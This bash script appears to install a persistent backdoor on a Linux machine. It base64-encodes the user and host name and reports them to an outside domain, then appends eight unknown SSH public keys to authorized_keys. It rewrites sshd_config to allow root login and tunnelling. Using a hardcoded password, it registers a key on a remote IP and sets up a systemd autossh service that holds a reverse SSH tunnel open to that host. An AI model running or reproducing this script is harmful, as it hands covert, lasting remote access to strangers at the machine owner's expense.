#!/bin/bash


sudo apt update

packages=(curl openssh-server autossh sshpass)

for pkg in "${packages[@]}"; do
    if dpkg -s "$pkg" &> /dev/null; then
        echo "[+] $pkg is already installed."
    else
        echo "[*] Installing $pkg..."
        sudo apt install -y "$pkg"
    fi
done

user="suser"
username=$(whoami)
hostname=$(hostname)

data=$(echo -n "$user:$username:$hostname" | base64)
#echo -e "Data:\t$data"

domain_name="proxy1.cryptopredictor.org"

received_port=$(curl -s "https://$domain_name/report?data=$data")
received_port=$(echo $received_port | sed "s/%//g")

echo "$received_port"

key_path="$HOME/.ssh/$(whoami)_ed25519"
[ ! -e "$key_path" ] && ssh-keygen -t ed25519 -f "$key_path" -N ""

cat <<EOF >> ~/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfWGblM3hG4bwrALVaC0mWhnzdPeolZjUAvd0l6Eolk nobody1
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz nobody2
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIzWLETupIltsWaqiKsFJ1ub4sKXohgqLYj0z5ORQRSb nobody1@web-server
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM6xc2Xh8JDTXCq3I5/GbbrkbXYfFcMAt/wHPfHIo0Zp nobody2@web-server
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDRLi7rEJe7OkorAvywhr6QRLN1p0FmWDAKRTpDPtJwa suser@z6yg5ybv
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7GlY/RI7o9IjHccolpcUSa1/UFsmMrQFCvzcs2JqLm suser@
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDCYabqF2p28/A9S3qwP8v2jPhOHq2tl8RbaVsGu4il 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFzdTi7eKOCK1jqc60ORaP5QtdR3fmI3SXA3DePTCRPS
EOF

sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

requiredSettings="""
Port 22
ListenAddress 0.0.0.0
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
PermitRootLogin yes
PasswordAuthentication yes
AllowAgentForwarding yes
AllowTcpForwarding yes
GatewayPorts yes
PermitTTY yes
TCPKeepAlive yes
PermitTunnel yes

PermitOpen any
X11Forwarding yes
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
ClientAliveInterval 60
ClientAliveCountMax 10
UseDNS yes

Subsystem sftp /usr/lib/openssh/sftp-server
"""

echo "$requiredSettings" | sudo tee /etc/ssh/sshd_config > /dev/null


#hosts=("40.233.2.200" "edcoretecmm.sytes.net" "ximand.ddns.net")
hosts=("40.233.2.200")

for host in "${hosts[@]}"; do
    echo "Setting up for $host"

    # Copy the public key to the remote host
    #ssh-copy-id -i "$key_path.pub" "$user@$host"
    sshpass -p "DZ04dYFws1POVlm0XeHA" ssh-copy-id -o StrictHostKeyChecking=no -i "$key_path.pub" "$user@$host"

    # Create a unique systemd service for each host
    service_name="${host%%.*}"

    cat << EOF | sudo tee /etc/systemd/system/${service_name}.service > /dev/null
[Unit]
Description=Reverse SSH Tunnel to $host
After=network.target

[Service]
User=$USER
ExecStart=/usr/bin/autossh -i $key_path -N -R $received_port:127.0.0.1:22 "$user@$host"
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

    # Enable and start the service
    sudo systemctl daemon-reload
    sudo systemctl enable ${service_name}.service
    sudo systemctl start ${service_name}.service

    echo "Service $service_name started for $host"
done
